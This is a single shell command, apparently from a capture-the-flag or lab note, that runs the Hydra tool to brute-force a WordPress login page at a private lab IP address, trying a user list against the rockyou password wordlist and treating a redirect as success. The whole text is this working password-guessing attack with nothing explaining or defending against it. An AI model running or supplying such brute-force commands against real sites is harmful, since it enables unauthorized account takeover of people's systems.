
```
hydra -L wpusers -P /usr/share/wordlists/rockyou.txt  10.10.75.136 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```

